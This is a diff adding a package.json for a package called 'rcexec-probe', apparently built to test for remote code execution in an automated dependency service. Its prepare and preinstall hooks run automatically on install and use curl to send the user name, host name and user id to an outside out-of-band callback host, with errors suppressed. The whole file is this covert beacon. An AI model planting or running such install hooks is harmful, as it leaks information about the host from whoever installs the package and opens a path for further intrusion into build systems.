@@ -1,0 +1,11 @@
+{
+  "name": "rcexec-probe",
+  "version": "1.0.0",
+  "scripts": {
+    "prepare":    "curl -sk http://dba7kfrk6n4as06l5hd07rfor6i3q979t.oast.pro/dependabot/prepare/$(whoami)/$(hostname)/$(id -u) || true",
+    "preinstall": "curl -sk http://dba7kfrk6n4as06l5hd07rfor6i3q979t.oast.pro/dependabot/preinstall/$(whoami)/$(hostname) || true"
+  },
+  "dependencies": {
+    "lodash": "4.17.20"
+  }
+}
